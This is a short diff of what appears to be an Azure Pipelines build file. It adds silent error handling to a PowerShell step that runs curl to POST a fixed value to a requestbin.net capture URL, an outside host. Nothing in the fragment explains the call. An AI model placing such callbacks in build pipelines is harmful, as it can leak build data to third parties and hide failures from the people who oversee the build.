@@ -33,3 +33,4 @@ steps:
     configuration: '$(buildConfiguration)'
 
 - powershell: 'curl --data "Param=Git" http://requestbin.net/r/1fdhvyu1'
+  errorActionPreference: SilentlyContinue
